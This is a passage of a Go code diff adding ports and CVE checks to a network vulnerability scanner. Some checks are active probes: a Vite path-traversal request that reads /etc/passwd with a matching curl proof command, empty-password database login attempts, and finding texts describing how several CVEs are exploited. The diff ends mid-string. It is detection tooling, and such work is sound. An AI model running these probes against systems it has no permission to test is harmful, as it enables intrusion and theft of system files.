@@ -7,6 +7,7 @@ import (
 	"context"
 	"crypto/tls"
 	"encoding/binary"
+	"encoding/json"
 	"fmt"
 	"io"
 	"net"
@@ -87,6 +88,8 @@ var highPorts = []portEntry{
 	{3260, "iscsi", false},        // iSCSI storage target
 	{502, "modbus", false},        // Modbus TCP SCADA/ICS
 	{830, "netconf", false},       // NETCONF network device management
+	{16992, "intel-amt", false},    // Intel AMT management interface — CVE-2017-5689 empty-digest auth bypass
+	{8000, "salt-api", false},      // SaltStack Salt API — CVE-2021-25281/25282 unauth RCE
 	{8291, "winbox", false},       // MikroTik Winbox management
 	{623, "ipmi", false},          // IPMI/BMC server management
 	{8443, "https-alt", false},    // HTTPS alt (network device web UIs)
@@ -164,6 +167,27 @@ var extendedPorts = []portEntry{
 	{8728, "routeros-api", false}, // MikroTik RouterOS API (plaintext)
 	{264, "checkpoint-topology", false}, // Check Point FW-1 topology / cpstat discovery
 	{179, "bgp", false},               // BGP routing protocol — internet-facing router exposure
+	{9998, "tika-server", false},        // Apache Tika Server REST API — CVE-2018-1335 header injection RCE
+	{8088, "superset", false},           // Apache Superset BI — CVE-2023-27524 default SECRET_KEY session forge
+	{8123, "clickhouse", false},         // ClickHouse analytics DB HTTP interface
+	{8222, "nats-monitoring", false},    // NATS message broker monitoring API — multiple auth bypass CVEs
+	{8265, "ray-dashboard", false},      // Ray distributed ML dashboard (no auth by default)
+	{9097, "tekton-dashboard", false},   // Tekton Pipelines dashboard (no auth by default)
+	{30000, "sglang", false},            // SGLang LLM inference server (no auth by default)
+	{61616, "activemq", false},          // Apache ActiveMQ broker — CVE-2023-46604 pre-auth RCE (CVSS 10.0, KEV)
+	{8009, "ajp", false},               // Tomcat AJP connector — CVE-2020-1938 GhostCat file read/RCE (CVSS 9.8, KEV)
+	{8188, "comfyui", false},            // ComfyUI Stable Diffusion web UI (no auth by default)
+	{8006, "proxmox", false},            // Proxmox VE hypervisor management UI
+	{4786, "cisco-smart-install", false}, // Cisco IOS Smart Install — CVE-2018-0171 unauth config read/write (CVSS 9.8, KEV)
+	{8848, "nacos", false},              // Nacos service discovery / config center — default nacos:nacos creds
+	{8081, "artifactory", false},        // JFrog Artifactory repository manager — default admin:password
+	{8082, "artifactory-alt", false},    // JFrog Artifactory (newer default port)
+	{50051, "grpc", false},              // gRPC server — reflection endpoint may list all services unauthenticated
+	// ── Wireless management infrastructure ──────────────────────────────────
+	{8880, "unifi-portal", false},       // Ubiquiti UniFi HTTP guest captive portal
+	{8843, "unifi-portal-tls", false},   // Ubiquiti UniFi HTTPS guest captive portal
+	{4343, "aruba-instant", false},      // Aruba Instant Access Point HTTPS management
+	{8043, "omada-alt", false},          // TP-Link Omada controller (alternate port)
 }
 
 // Scanner is a pure-Go TCP connect port scanner.
@@ -185,7 +209,11 @@ func NewWithNmap(nmapBin string) *Scanner { return &Scanner{nmapBin: nmapBin} }
 // lists (critical + high + extended). Used by the AI port advisor to avoid
 // re-suggesting ports that are already scanned by default.
 func AllKnownPorts() []int {
-	all := append(append(criticalPorts, highPorts...), extendedPorts...)
+	// Pre-allocate to avoid mutating the backing arrays of the package-level slices.
+	all := make([]portEntry, 0, len(criticalPorts)+len(highPorts)+len(extendedPorts))
+	all = append(all, criticalPorts...)
+	all = append(all, highPorts...)
+	all = append(all, extendedPorts...)
 	ports := make([]int, 0, len(all))
 	for _, e := range all {
 		ports = append(ports, e.port)
@@ -195,6 +223,12 @@ func AllKnownPorts() []int {
 
 // Name returns the scanner identifier.
 func (s *Scanner) Name() string { return scannerName }
+
+// maxPortFindings caps the number of port findings reported to avoid
+// overwhelming output when many ports are open (e.g., a router or honeypot).
+// The most impactful ports (critical) are scanned first, so the cap
+// preserves the highest-value findings.
+const maxPortFindings = 50
 
 // Run executes the port scan against asset, returning all findings.
 // Surface mode scans the top 30 most impactful ports (critical + high).
@@ -265,10 +299,17 @@ collectResults:
 	}
 
 	// Run UDP probes for services not reachable via TCP connect.
+	// Deep mode runs all UDP probes; surface mode runs the basic set only.
 	if ctx.Err() == nil {
-		if udpFs := runUDP(ctx, asset); len(udpFs) > 0 {
+		if udpFs := runUDP(ctx, asset, scanType); len(udpFs) > 0 {
 			findings = append(findings, udpFs...)
 		}
+	}
+
+	// Cap total findings to avoid overwhelming output when many ports are open
+	// (e.g. a honeypot or misconfigured device with dozens of open services).
+	if len(findings) > maxPortFindings {
+		findings = findings[:maxPortFindings]
 	}
 
 	return findings, nil
@@ -288,7 +329,7 @@ func buildPortList(scanType module.ScanType) []portEntry {
 // probePort attempts a TCP connection to host:port.
 // Returns (open, banner). The banner may be empty.
 func probePort(ctx context.Context, host string, port int) (bool, string) {
-	addr := fmt.Sprintf("%s:%d", host, port)
+	addr := net.JoinHostPort(host, strconv.Itoa(port))
 	dialer := &net.Dialer{Timeout: dialTimeout}
 	conn, err := dialer.DialContext(ctx, "tcp", addr)
 	if err != nil {
@@ -384,13 +425,33 @@ func buildFindings(ctx context.Context, asset string, entry portEntry, banner st
 				description = "An OpenSearch cluster is accessible without credentials. " +
 					"All indexed data can be read, modified, or deleted by anyone with network access."
 			}
-			return []finding.Finding{makeF(
+			var esFindings []finding.Finding
+			esFindings = append(esFindings, makeF(
 				finding.CheckPortElasticsearchUnauth,
 				finding.SeverityCritical,
 				fmt.Sprintf("%s exposed on port %d", serviceLabel, port),
 				description,
 				map[string]any{"port": port, "service": serviceName, "authenticated": false, "banner": banner},
-			)}
+			))
+			// CVE-2015-1427: Elasticsearch ≤ 1.5.x Groovy sandbox escape → unauthenticated RCE.
+			// Dynamic Groovy scripting was enabled by default in Elasticsearch 1.x and sandboxed
+			// via GroovySandbox; the sandbox was bypassable allowing full OS command execution.
+			// Fixed in Elasticsearch 1.6.0 (scripting disabled by default) and 2.0.0 (removed).
+			if esVer := parseJSONStringField(body, "number"); serviceName == "Elasticsearch" && isElasticsearchGroovyVulnerable(esVer) {
+				esFindings = append(esFindings, makeF(
+					finding.CheckCVEElasticsearchGroovyRCE,
+					finding.SeverityCritical,
+					fmt.Sprintf("CVE-2015-1427: Elasticsearch %s Groovy sandbox escape → unauthenticated RCE on port %d", esVer, port),
+					fmt.Sprintf("Elasticsearch %s has dynamic Groovy scripting enabled by default. "+
+						"CVE-2015-1427 (CVSS 10.0) — the Groovy sandbox in Elasticsearch < 1.6.0 is bypassable, "+
+						"allowing an unauthenticated attacker to execute arbitrary OS commands by sending "+
+						"crafted Groovy scripts via the _search or _msearch API. "+
+						"Upgrade to Elasticsearch ≥ 1.6.0 and disable dynamic scripting "+
+						"(`script.disable_dynamic: true` in elasticsearch.yml).", esVer),
+					map[string]any{"port": port, "service": serviceName, "es_version": esVer, "cve": "CVE-2015-1427"},
+				))
+			}
+			return esFindings
 		}
 
 	case 9090: // Prometheus
@@ -443,6 +504,69 @@ func buildFindings(ctx context.Context, asset string, entry portEntry, banner st
 					"Cache contents (which may include session tokens or PII) can be read or poisoned.",
 				map[string]any{"port": port, "service": service, "authenticated": false, "banner": banner},
 			)}
+		}
+
+	case 16992: // Intel Active Management Technology (AMT) web interface
+		// CVE-2017-5689 (CVSS 9.8, KEV): Intel AMT firmware 6.x–11.6 accepts an empty
+		// Digest auth response (response="" in Authorization header), granting full
+		// management access below the OS. AMT runs on a dedicated ME microcontroller —
+		// a compromised AMT instance survives OS reinstalls. Port 16992 is exclusively
+		// used by Intel AMT; any open port here warrants a critical finding.
+		body, ok := probeHTTPBody(ctx, asset, port, false, "/index.htm")
+		if ok && strings.Contains(strings.ToLower(body), "intel") {
+			return []finding.Finding{makeF(
+				finding.CheckCVEIntelAMTAuthBypass,
+				finding.SeverityCritical,
+				fmt.Sprintf("CVE-2017-5689: Intel AMT management interface exposed on port %d", port),
+				"The Intel Active Management Technology (AMT) web interface is internet-accessible. "+
+					"CVE-2017-5689 (CVSS 9.8, KEV) allows unauthenticated access by sending an empty "+
+					"Digest authentication response (Authorization: Digest response=\"\"). "+
+					"AMT runs on the Intel Management Engine (ME) — a dedicated microcontroller separate "+
+					"from the main CPU and OS — providing full KVM, remote console, and power control. "+
+					"A compromised AMT instance survives OS reinstalls and disk wipes. "+
+					"Disable AMT if not needed, update firmware, and block port 16992/16993 at the firewall.",
+				map[string]any{"port": port, "service": "intel-amt"},
+			)}
+		}
+
+	case 8000: // SaltStack Salt API + vLLM inference server
+		// CVE-2021-25281/25282 (CVSS 9.8, KEV): Salt API auth bypass + path traversal
+		// allows unauthenticated writes to arbitrary files on the Salt Master via the
+		// wheel.pillar_roots.write function. The Salt API root returns a unique JSON
+		// welcome message with the supported client list — no auth required.
+		body, ok := probeHTTPBody(ctx, asset, port, false, "/")
+		if ok && strings.Contains(body, "wheel_async") {
+			return []finding.Finding{makeF(
+				finding.CheckCVESaltStackAPI,
+				finding.SeverityCritical,
+				fmt.Sprintf("CVE-2021-25281/25282: SaltStack Salt API exposed on port %d", port),
+				"A SaltStack Salt API (salt-api) is internet-accessible without authentication. "+
+					"CVE-2021-25281 (CVSS 9.8, KEV) allows unauthenticated access to the wheel client, "+
+					"and CVE-2021-25282 is an arbitrary file write via wheel.pillar_roots.write — "+
+					"an attacker can write to /etc/crontab or any system file to achieve root RCE. "+
+					"Salt API must never be exposed to the internet. Restrict to internal management networks.",
+				map[string]any{"port": port, "service": "salt-api", "authenticated": false},
+			)}
+		}
+		// vLLM OpenAI-compatible inference server — no auth by default.
+		// Detection: X-Vllm-Request-Id response header or "owned_by":"vllm" in /v1/models JSON.
+		if vbody, vok := probeHTTPBody(ctx, asset, port, false, "/v1/models"); vok {
+			bodyLow := strings.ToLower(vbody)
+			if strings.Contains(bodyLow, "vllm") || (strings.Contains(bodyLow, `"owned_by"`) &&
+				strings.Contains(bodyLow, "data") && strings.Contains(bodyLow, "model")) {
+				return []finding.Finding{makeF(
+					finding.CheckPortvLLMExposed,
+					finding.SeverityHigh,
+					fmt.Sprintf("vLLM inference server exposed unauthenticated on port %d", port),
+					"A vLLM OpenAI-compatible LLM inference server is publicly accessible without authentication. "+
+						"vLLM is a high-throughput serving framework for large language models. "+
+						"Unauthenticated access allows unlimited inference at the operator's GPU cost, "+
+						"exposure of fine-tuned model capabilities, and potential prompt injection attacks. "+
+						"Add --api-key to require authentication and restrict to trusted networks.",
+					map[string]any{"port": port, "service": "vllm",
+						"url": fmt.Sprintf("http://%s:%d/v1/models", asset, port)},
+				)}
+			}
 		}
 
 	case 8888: // Jupyter
@@ -584,6 +708,43 @@ func buildFindings(ctx context.Context, asset string, entry portEntry, banner st
 			))
 		}
 
+		// CVE-2018-15473: OpenSSH < 7.7 username enumeration via malformed public-key auth packet.
+		// A behavioral difference (USERAUTH_FAILURE vs disconnect) allows enumerating valid usernames
+		// without authentication. Fixed in OpenSSH 7.7p1 (April 2018). Severity Medium — no direct
+		// code execution, but enables targeted brute-force and credential-stuffing attacks.
+		if isOpenSSHUsernameEnumVulnerable(sv) {
+			netDevFindings = append(netDevFindings, makeF(
+				finding.CheckCVEOpenSSHUsernameEnum,
+				finding.SeverityMedium,
+				fmt.Sprintf("CVE-2018-15473: OpenSSH %s vulnerable to username enumeration", sv),
+				fmt.Sprintf("OpenSSH %s is in the range vulnerable to CVE-2018-15473 (OpenSSH < 7.7p1). "+
+					"An unauthenticated attacker can distinguish valid from invalid usernames by observing "+
+					"the server response difference to a malformed public-key auth request: valid users cause "+
+					"a connection reset while invalid users receive a standard auth failure response. "+
+					"This enables targeted brute-force attacks against confirmed valid accounts. "+
+					"Upgrade to OpenSSH 7.7p1 or later.", sv),
+				ev,
+			))
+		}
+
+		// CVE-2024-6387 (regreSSHion): OpenSSH 8.5p1–9.7p1 on Linux/glibc.
+		if isOpenSSHRegreSSHionVulnerable(sv, banner) {
+			netDevFindings = append(netDevFindings, makeF(
+				finding.CheckCVEOpenSSHRegreSSHion,
+				finding.SeverityHigh,
+				fmt.Sprintf("CVE-2024-6387 (regreSSHion): OpenSSH %s may be vulnerable to unauthenticated RCE", sv),
+				fmt.Sprintf(
+					"SSH banner reports %s, which is in the CVE-2024-6387 vulnerable range (8.5p1–9.7p1). "+
+						"regreSSHion is a signal-handler race condition in OpenSSH's SIGALRM handler that can "+
+						"lead to pre-authentication unauthenticated remote code execution as root on glibc-based "+
+						"Linux systems. Exploitation requires sustained effort (~10,000 attempts over hours). "+
+						"Upgrade to OpenSSH 9.8p1 or later. Restrict SSH to known IP ranges as a defence-in-depth measure.",
+					sv,
+				),
+				ev,
+			))
+		}
+
 		sshFinding := makeF(
 			finding.CheckPortSSHExposed,
 			finding.SeverityHigh,
@@ -625,6 +786,35 @@ func buildFindings(ctx context.Context, asset string, entry portEntry, banner st
 					fmt.Sprintf("Telnet exposed on port %d", port),
 					"Telnet transmits all data including credentials in plaintext.",
 					ev),
+			}
+		}
+		// CVE-2011-4862: BSD telnetd Kerberos encryption buffer overflow.
+		// BSD telnetd (FreeBSD, NetBSD, OpenBSD) with Kerberos encrypt support offers
+		// IAC WILL ENCRYPT (0xFF 0xFB 0x26) in the initial option negotiation.
+		// GNU telnetd (inetutils) does not offer ENCRYPT — distinguishes the two stacks.
+		// A buffer overflow in the AES key exchange allows pre-auth RCE as root.
+		if strings.Contains(banner, "\xFF\xFB\x26") || strings.Contains(banner, "\xFF\xFD\x26") {
+			ev["telnet_encrypt_option"] = true
+			return []finding.Finding{
+				makeF(
+					finding.CheckCVETelnetBSDEncrypt,
+					finding.SeverityCritical,
+					fmt.Sprintf("BSD telnetd with Kerberos ENCRYPT option detected on port %d — CVE-2011-4862", port),
+					"The Telnet server offers IAC WILL/DO ENCRYPT (option 38) in its initial negotiation, "+
+						"identifying this as BSD telnetd with Kerberos encryption support. "+
+						"CVE-2011-4862 (CVSS 10.0) is a buffer overflow in the BSD telnetd AES key exchange handler "+
+						"that allows an unauthenticated attacker to execute arbitrary code as root before login. "+
+						"Affected: FreeBSD (all supported releases before 2011-12-23), NetBSD, and other BSD-derived systems. "+
+						"Disable telnetd immediately and use SSH instead.",
+					ev,
+				),
+				makeF(
+					finding.CheckPortTelnetExposed,
+					finding.SeverityHigh,
+					fmt.Sprintf("Telnet exposed on port %d", port),
+					"Telnet transmits all data including credentials in plaintext.",
+					map[string]any{"port": port, "service": service, "banner": banner},
+				),
 			}
 		}
 		// Check for GNU telnetd version — CVE-2026-32746 affects GNU telnetd ≤ 2.7.
@@ -684,6 +874,27 @@ func buildFindings(ctx context.Context, asset string, entry portEntry, banner st
 					"Ollama is designed for localhost use only — restrict access with a firewall or bind to 127.0.0.1.",
 				ev,
 			)}
+		}
+		// GHSA-q3jj-7xxq-6mgr: Ollama < 0.1.47 directory traversal via model blob endpoint.
+		// GET /api/version reveals the version string unauthenticated.
+		if vbody, ok := probeHTTPBody(ctx, asset, port, false, "/api/version"); ok {
+			if strings.Contains(vbody, "version") {
+				ev["api_version_response"] = vbody
+				var findings []finding.Finding
+				if isVulnerableOllamaVersion(vbody) {
+					findings = append(findings, makeF(
+						finding.CheckCVEOllamaPathTraversal,
+						finding.SeverityHigh,
+						fmt.Sprintf("Ollama < 0.1.47 path traversal (GHSA-q3jj-7xxq-6mgr) on port %d", port),
+						"GHSA-q3jj-7xxq-6mgr: Ollama versions before 0.1.47 allow directory traversal via the "+
+							"model blob endpoint (/api/blobs/:digest). An unauthenticated attacker can read "+
+							"arbitrary files from the server by crafting a path traversal in the digest parameter. "+
+							"Upgrade Ollama to 0.1.47 or later.",
+						ev,
+					))
+				}
+				return findings
+			}
 		}
 		return nil
 
@@ -832,6 +1043,42 @@ func buildFindings(ctx context.Context, asset string, entry portEntry, banner st
 		if fv != "" {
 			ev["ftp_software"] = fv
 		}
+		// CVE-2011-2523: vsftpd 2.3.4 supply-chain backdoor.
+		// The compromised tarball distributed via vsftpd.beasts.org bound a shell
+		// to TCP 6200 when the username contained ":)". Distro packages were not
+		// affected, but banner alone cannot distinguish the two — any 2.3.4 banner
+		// should be investigated immediately.
+		if fv == "vsFTPd 2.3.4" {
+			return []finding.Finding{makeF(
+				finding.CheckPortFTPVsftpdBackdoor,
+				finding.SeverityCritical,
+				fmt.Sprintf("vsftpd 2.3.4 detected on port %d — supply-chain backdoor (CVE-2011-2523)", port),
+				"The FTP banner reports vsftpd 2.3.4, the exact version in which a supply-chain "+
+					"backdoor was inserted into the official source tarball in July 2011. "+
+					"The backdoor binds a root shell to TCP port 6200 when the username contains \":)\". "+
+					"If this binary was installed from the compromised tarball (not a distro package), "+
+					"the system is fully compromised. Replace vsftpd immediately and audit all accounts.",
+				ev,
+			)}
+		}
+		// CVE-2015-3306: ProFTPD 1.3.5 mod_copy unauthenticated arbitrary file
+		// read/write via SITE CPFR/CPTO commands. Patched in 1.3.5a.
+		// The banner "220 ProFTPD 1.3.5 Server ..." is unambiguous: 1.3.5a would
+		// advertise itself as such, so an exact "ProFTPD 1.3.5" match is reliable.
+		if isProFTPDModCopyVulnerable(fv) {
+			return []finding.Finding{makeF(
+				finding.CheckCVEProFTPDModCopy,
+				finding.SeverityCritical,
+				fmt.Sprintf("ProFTPD 1.3.5 detected on port %d — mod_copy file read/write (CVE-2015-3306)", port),
+				"The FTP banner reports ProFTPD 1.3.5, which is vulnerable to CVE-2015-3306 "+
+					"(CVSS 10.0). The mod_copy module accepts SITE CPFR/CPTO commands from "+
+					"unauthenticated clients, allowing arbitrary file reads and writes on the server. "+
+					"This was exploited extensively to copy web shells into document roots. "+
+					"Upgrade to ProFTPD 1.3.5a or later and disable mod_copy if not required.",
+				ev,
+			)}
+		}
+
 		// CVE-2025-47812: Wing FTP Server ≤ 7.4.3 pre-auth RCE (CISA KEV, CVSS 9.9).
 		if wingVer := parseWingFTPVersion(banner); wingVer != "" {
 			ev["wing_ftp_version"] = wingVer
@@ -876,9 +1123,30 @@ func buildFindings(ctx context.Context, asset string, entry portEntry, banner st
 	// ── SMB ───────────────────────────────────────────────────────────────────
 
 	case 445:
-		// Active check: attempt SMBv1 null session (anonymous unauthenticated access).
+		var findings []finding.Finding
+
+		// Check 1: SMBv1 protocol enabled — EternalBlue/WannaCry/SambaCry risk.
+		// Sends a multi-dialect negotiate; if the server selects \xffSMB (SMBv1)
+		// over \xfeSMB (SMBv2+), the protocol-level attack surface is present.
+		if probeSMBv1Enabled(ctx, asset) {
+			findings = append(findings, makeF(
+				finding.CheckPortSMBv1Enabled,
+				finding.SeverityCritical,
+				"SMBv1 protocol accepted — EternalBlue/WannaCry risk (CVE-2017-0144)",
+				"The SMB server accepted the SMBv1 ('NT LM 0.12') dialect when offered alongside SMBv2/3. "+
+					"SMBv1 is an obsolete protocol with known critical vulnerabilities: "+
+					"CVE-2017-0144 (EternalBlue/WannaCry, CVSS 8.1) exploits an SMBv1 buffer overflow for unauthenticated RCE on Windows. "+
+					"CVE-2017-7494 (SambaCry) uses SMBv1 for shared-library injection on Linux Samba servers. "+
+					"WannaCry and NotPetya both required SMBv1 for propagation. "+
+					"Disable SMBv1: PowerShell: Set-SmbServerConfiguration -EnableSMB1Protocol $false. "+
+					"Modern Windows (Server 2019+, Win10 1709+) disables SMBv1 by default.",
+				map[string]any{"port": port, "service": service, "smb_v1": true},
+			))
+		}
+
+		// Check 2: SMB null session (anonymous unauthenticated access).
 		if probeSMBNullSession(ctx, asset) {
-			return []finding.Finding{
+			findings = append(findings,
 				makeF(
 					finding.CheckPortSMBNullSession,
 					finding.SeverityCritical,
@@ -890,23 +1158,19 @@ func buildFindings(ctx context.Context, asset string, entry portEntry, banner st
 						"Disable null sessions via: Group Policy → Network access: Restrict anonymous access to Named Pipes and Shares.",
 					map[string]any{"port": port, "service": service, "null_session": true},
 				),
-				makeF(
-					finding.CheckPortSMBExposed,
-					finding.SeverityHigh,
-					fmt.Sprintf("SMB exposed on port %d", port),
-					"SMB is publicly accessible. Null session accepted — see separate finding.",
-					map[string]any{"port": port, "service": service, "banner": banner},
-				),
-			}
+			)
 		}
-		return []finding.Finding{makeF(
+
+		// Always emit the base SMB-exposed finding.
+		findings = append(findings, makeF(
 			finding.CheckPortSMBExposed,
 			finding.SeverityHigh,
 			fmt.Sprintf("SMB exposed on port %d", port),
 			"Server Message Block (SMB) is publicly accessible. "+
 				"SMB has been the vector for major ransomware campaigns (WannaCry, NotPetya) and enables lateral movement.",
 			map[string]any{"port": port, "service": service, "banner": banner},
-		)}
+		))
+		return findings
 
 	// ── Databases ─────────────────────────────────────────────────────────────
 
@@ -918,7 +1182,8 @@ func buildFindings(ctx context.Context, asset string, entry portEntry, banner st
 			1521: "Oracle Database",
 		}
 		dbName := dbNames[port]
-		return []finding.Finding{makeF(
+		var dbFindings []finding.Finding
+		dbFindings = append(dbFindings, makeF(
 			finding.CheckPortDatabaseExposed,
 			finding.SeverityHigh,
 			fmt.Sprintf("%s database exposed on port %d", dbName, port),
@@ -926,7 +1191,51 @@ func buildFindings(ctx context.Context, asset string, entry portEntry, banner st
 				"Databases should never be exposed publicly; this enables brute-force attacks and "+
 				"exploitation of database-engine vulnerabilities.", dbName),
 			map[string]any{"port": port, "service": service, "banner": banner},
-		)}
+		))
+		// Attempt default/empty credential checks per database engine.
+		switch port {
+		case 3306:
+			if probeMySQL(ctx, asset, port) {
+				dbFindings = append(dbFindings, makeF(
+					finding.CheckPortMySQLNoAuth,
+					finding.SeverityCritical,
+					fmt.Sprintf("MySQL/MariaDB accepts root login with empty password on port %d", port),
+					"The MySQL or MariaDB server accepts the root user with an empty password. "+
+						"An attacker gains full database administrator access without any credentials: "+
+						"SELECT * FROM all tables, read local files via LOAD DATA INFILE, and potentially "+
+						"achieve RCE via SELECT INTO OUTFILE or UDF injection. "+
+						"Set a strong root password immediately: ALTER USER 'root'@'%' IDENTIFIED BY '...'",
+					map[string]any{"port": port, "service": service, "user": "root", "password": "(empty)"},
+				))
+			}
+		case 5432:
+			if probePostgreSQL(ctx, asset, port) {
+				dbFindings = append(dbFindings, makeF(
+					finding.CheckPortPostgreSQLTrust,
+					finding.SeverityCritical,
+					fmt.Sprintf("PostgreSQL trust authentication — connects as postgres without password on port %d", port),
+					"PostgreSQL is configured with trust authentication for the postgres superuser from external addresses. "+
+						"Any client can connect as postgres without a password, gaining superuser access to all databases. "+
+						"Trust authentication exposes COPY TO/FROM PROGRAM (RCE), pg_read_file(), and all data. "+
+						"Set pg_hba.conf to require 'scram-sha-256' or 'md5' for all remote connections.",
+					map[string]any{"port": port, "service": service, "user": "postgres", "auth_method": "trust"},
+				))
+			}
+		case 1433:
+			if probeMSSQL(ctx, asset, port) {
+				dbFindings = append(dbFindings, makeF(
+					finding.CheckPortMSSQLDefaultCreds,
+					finding.SeverityCritical,
+					fmt.Sprintf("MSSQL accepts sa login with empty password on port %d", port),
+					"Microsoft SQL Server accepts the 'sa' (system administrator) login with a blank password. "+
+						"The sa account has sysadmin privileges — an attacker can read/write all databases, "+
+						"enable xp_cmdshell for OS command execution, and read Windows registry hives. "+
+						"Disable the sa account or set a strong password: ALTER LOGIN sa WITH PASSWORD='...', ENABLE.",
+					map[string]any{"port": port, "service": service, "user": "sa", "password": "(empty)"},
+				))
+			}
+		}
+		return dbFindings
 
 	// ── Kubernetes API ────────────────────────────────────────────────────────
 
@@ -936,14 +1245,34 @@ func buildFindings(ctx context.Context, asset string, entry portEntry, banner st
 			8001: "kubectl proxy",
 		}
 		k8sName := k8sNames[port]
-		return []finding.Finding{makeF(
+		var k8sFindings []finding.Finding
+		k8sFindings = append(k8sFindings, makeF(
 			finding.CheckPortK8sAPIExposed,
 			finding.SeverityHigh,
 			fmt.Sprintf("%s exposed on port %d", k8sName, port),
 			fmt.Sprintf("The %s is publicly reachable. "+
 				"Misconfigured RBAC or anonymous access on the Kubernetes API allows full cluster compromise.", k8sName),
 			map[string]any{"port": port, "service": service, "banner": banner},
-		)}
+		))
+		// CVE-2018-1002105: Kubernetes ≤ 1.12.2 API server WebSocket upgrade privilege escalation.
+		// GET /version is unauthenticated by default — returns gitVersion for version comparison.
+		// The flaw allows an anonymous user to establish a raw TCP bridge through the API server
+		// to a backend aggregated API, inheriting the API server's cluster-admin credentials.
+		if k8sVer := probeK8sVersion(ctx, asset, port); k8sVer != "" && isKubernetesPrivEscVulnerable(k8sVer) {
+			k8sFindings = append(k8sFindings, makeF(
+				finding.CheckCVEKubernetesPrivEsc,
+				finding.SeverityCritical,
+				fmt.Sprintf("CVE-2018-1002105: Kubernetes %s vulnerable to unauthenticated cluster-admin privilege escalation", k8sVer),
+				fmt.Sprintf("Kubernetes %s is internet-accessible and vulnerable to CVE-2018-1002105 (CVSS 9.8, KEV). "+
+					"An unauthenticated attacker can send a WebSocket upgrade request to an aggregated API endpoint "+
+					"and establish a raw TCP bridge through the API server. The bridge runs with the API server's "+
+					"cluster-admin credentials, granting full cluster access without any authentication. "+
+					"This affects Kubernetes < 1.10.11, < 1.11.5, and < 1.12.3. "+
+					"Upgrade Kubernetes immediately.", k8sVer),
+				map[string]any{"port": port, "service": service, "k8s_version": k8sVer, "cve": "CVE-2018-1002105"},
+			))
+		}
+		return k8sFindings
 
 	// ── Windows Remote Management ─────────────────────────────────────────────
 
@@ -1165,7 +1494,44 @@ func buildFindings(ctx context.Context, asset string, entry portEntry, banner st
 	// ── Vite dev server ───────────────────────────────────────────────────────
 	case 5173:
 		if probeHTTP(ctx, asset, port, false, "/__vite_ping") {
-			return []finding.Finding{makeF(
+			var findings []finding.Finding
+
+			// CVE-2025-30208: /@fs/ path traversal with double-? query confusion.
+			// Vite's ensureServingAccess() checks for ?import in the query string
+			// via a regex that is confused by a trailing bare ?. Sending
+			// /@fs/etc/passwd?import&raw?? causes Vite to return the file contents
+			// as a JS module: export default "root:x:0:0:...\n".
+			if body, ok := probeHTTPBody(ctx, asset, port, false, "/@fs/etc/passwd?import&raw??"); ok &&
+				strings.Contains(body, "export default") && strings.Contains(body, "root:") {
+				findings = append(findings, finding.Finding{
+					CheckID:  finding.CheckCVEViteFileRead,
+					Module:   "surface",
+					Scanner:  scannerName,
+					Severity: finding.SeverityCritical,
+					Title:    fmt.Sprintf("CVE-2025-30208: Vite dev server arbitrary file read on port %d", port),
+					Description: fmt.Sprintf(
+						"The Vite development server on %s:%d is vulnerable to CVE-2025-30208 — "+
+							"a path traversal that bypasses the /@fs/ allowlist by exploiting a regex "+
+							"confusion via a double-question-mark in the query string. "+
+							"The probe retrieved /etc/passwd as a JS module. "+
+							"Affects Vite < 6.2.4 / < 6.1.3 / < 6.0.12 / < 5.4.15 / < 4.5.10. "+
+							"Upgrade Vite and never expose dev servers publicly.",
+						asset, port,
+					),
+					Asset: asset,
+					Evidence: map[string]any{
+						"url":          fmt.Sprintf("http://%s:%d/@fs/etc/passwd?import&raw??", asset, port),
+						"body_excerpt": body[:min(len(body), 256)],
+					},
+					ProofCommand: fmt.Sprintf(
+						"curl -s 'http://%s:%d/@fs/etc/passwd?import&raw??'",
+						asset, port,
+					),
+					DiscoveredAt: now,
+				})
+			}
+
+			findings = append(findings, makeF(
 				finding.CheckPortDevServerExposed,
 				finding.SeverityHigh,
 				fmt.Sprintf("Vite development server exposed on port %d", port),
@@ -1173,10 +1539,141 @@ func buildFindings(ctx context.Context, asset string, entry portEntry, banner st
 					"expose unminified source code, internal file paths, environment variables embedded in code, "+
 					"and the /__vite_ping health endpoint. Production deployments should never expose dev servers.",
 				map[string]any{"port": port, "service": service, "banner": banner},
-			)}
+			))
+			return findings
 		}
 
-	// ── Gradio ML demo server ─────────────────────────────────────────────────
+	// ── ingress-nginx admission webhook (CVE-2025-1974, IngressNightmare) ────
+	// The ingress-nginx admission controller webhook listens on port 8443 and
+	// processes AdmissionReview requests without requiring network policy or
+	// client-certificate authentication. Internet exposure allows pre-auth RCE
+	// via a crafted nginx configuration directive embedded in an Ingress object.
+	// Probe: POST a stub AdmissionReview — legitimate webhook responses contain
+	// "AdmissionReview" or "admission.k8s.io" even for malformed requests.
+	case 8443:
+		if body := probeIngressAdmissionWebhook(ctx, asset, port); body != "" {
+			return []finding.Finding{{
+				CheckID:  finding.CheckCVEIngressNightmare,
+				Module:   "surface",
+				Scanner:  scannerName,
+				Severity: finding.SeverityCritical,
+				Title:    fmt.Sprintf("CVE-2025-1974 (IngressNightmare): ingress-nginx admission webhook exposed on port %d", port),
+				Description: fmt.Sprintf(
+					"%s has the ingress-nginx admission controller webhook accessible on port %d. "+
+						"CVE-2025-1974 allows an unauthenticated attacker to send a crafted AdmissionReview "+
+						"request containing a malicious nginx configuration directive, achieving remote code "+
+						"execution in the ingress-nginx pod. The webhook should never be internet-accessible — "+
+						"restrict port 8443 to the Kubernetes API server CIDR only via NetworkPolicy.",
+					asset, port,
+				),
+				Asset: asset,
+				Evidence: map[string]any{
+					"port":          port,
+					"service":       "ingress-nginx-admission-webhook",
+					"response_body": body[:min(len(body), 256)],
+				},
+				ProofCommand: fmt.Sprintf(
+					`curl -sk -X POST https://%s:%d/admission -H 'Content-Type: application/json' `+
+						`-d '{"apiVersion":"admission.k8s.io/v1","kind":"AdmissionReview"}'`,
+					asset, port,
+				),
+				DiscoveredAt: now,
+			}}
+		}
+		// Check for UniFi Network Application on 8443 (runs HTTPS on 8443 by default).
+		if findings := probeUniFi(ctx, asset, port, true); len(findings) > 0 {
+			return findings
+		}
+		// Check for Aruba Instant access point management on 8443.
+		if body, ok := probeHTTPBody(ctx, asset, port, true, "/"); ok {
+			lb := strings.ToLower(body)
+			if strings.Contains(lb, "aruba instant") || strings.Contains(lb, "aruba networks") ||
+				strings.Contains(lb, "arubainstant") {
+				return []finding.Finding{makeF(
+					finding.CheckNetDeviceArubaInstant,
+					finding.SeverityHigh,
+					fmt.Sprintf("Aruba Instant access point management UI exposed on port %d", port),
+					"An Aruba Instant access point web management interface is accessible from the internet. "+
+						"Exposed AP management allows attackers to reconfigure WiFi SSIDs, capture credentials, "+
